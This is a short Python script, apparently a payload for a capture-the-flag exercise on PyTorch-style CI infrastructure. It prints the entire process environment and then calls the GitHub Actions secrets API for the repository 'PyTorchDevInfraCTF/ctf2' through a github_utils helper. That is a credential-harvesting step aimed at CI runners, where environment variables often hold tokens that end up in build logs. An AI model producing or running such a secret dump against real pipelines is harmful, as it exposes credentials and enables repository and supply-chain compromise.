#!/usr/bin/env python3

from github_utils import gh_fetch_url_and_headers
def main():
    import os
    print(os.environ)
    print(gh_fetch_url_and_headers("https://api.github.com/repos/PyTorchDevInfraCTF/ctf2/actions/secrets"))


if __name__ == "__main__":
    main()
